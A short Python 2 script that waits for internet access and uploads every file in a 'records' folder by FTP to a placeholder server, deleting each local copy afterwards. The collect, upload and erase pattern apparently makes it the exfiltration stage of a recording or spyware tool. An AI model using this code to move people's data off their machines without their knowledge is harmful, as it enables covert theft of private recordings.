import ftplib
import os
import urllib2
import time

def internetOn():
    try:
        response=urllib2.urlopen('http://www.google.it',timeout=1)
        return True
    except urllib2.URLError as err: pass
    return False

files = []
for file in os.listdir("records"):
    if os.path.getsize("records/"+file)<100:
	os.remove("records/"+file)
    else:
	files.append(file)

on=0
while on==0:
	time.sleep(3)
	if internetOn():
		on=1 

for file in files:
	try:
        	ftp = ftplib.FTP("HOSTFTP","USERNAME","PASSWORD")
		print "[+] Connected"
		record = open("records/"+file,"rb")
		print "[ ] Uploading..."+file
		ftp.storbinary("STOR records/"+file, record)
		ftp.quit()
		record.close()
		print "[+] Uploaded "+file
		os.remove("records/"+file)
		print "[+] Removed "+file
	except:	
		print "[-] Error"

print "[+] All done"
